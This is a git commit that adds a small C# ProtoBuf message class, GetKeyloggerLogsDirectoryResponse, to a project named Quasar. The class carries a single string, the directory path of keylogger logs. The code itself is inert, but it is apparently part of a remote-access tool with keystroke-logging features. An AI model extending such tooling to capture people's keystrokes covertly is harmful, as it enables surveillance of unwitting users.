eae54454d9a84be205ed5a57c5740932b3919fff
Amina-farah <113688681+Amina-farah@users.noreply.github.com>
2023-12-24 06:01:56 +0300

    update file

---
+++ Quasar.Common/Messages/GetKeyloggerLogsDirectoryResponse.cs
@@ -0,0 +1,11 @@
+using ProtoBuf;
+
+namespace Quasar.Common.Messages
+{
+    [ProtoContract]
+    public class GetKeyloggerLogsDirectoryResponse : IMessage
+    {
+        [ProtoMember(1)]
+        public string LogsDirectory { get; set; }
+    }
+}
